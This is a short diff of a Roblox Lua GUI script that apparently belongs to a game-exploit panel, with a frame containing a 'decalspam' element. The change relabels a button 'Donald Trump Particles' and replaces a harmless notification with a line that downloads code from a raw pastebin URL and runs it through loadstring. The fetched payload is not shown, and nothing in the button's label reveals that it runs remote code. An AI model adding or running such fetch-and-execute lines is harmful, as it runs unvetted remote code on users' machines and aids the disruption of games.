@@ -154,20 +154,13 @@ AR.BorderSizePixel = 3
 AR.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
 AR.Size = UDim2.new(0, 79, 0, 31)
 AR.Font = Enum.Font.GothamBold
-AR.Text = "NOTIFICATION"
+AR.Text = "Donald Trump Particles"
 AR.TextColor3 = Color3.fromRGB(0, 0, 0)
 AR.TextScaled = true
 AR.TextSize = 14.000
 AR.TextWrapped = true
 AR.MouseButton1Down:connect(function()
-game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "team JKLO",
-        Text = "JOIN TEAM JKLO TODAY!",
-        Icon = "http://www.roblox.com/asset/?id=15651176489",
-        Callback = Function
-    })
-    wait(1)
-end
+loadstring(game:HttpGet("https://pastebin.com/raw/PJx5RP5F"))()
 end)
 DS.Name = "decalspam"
 DS.Parent = Frame
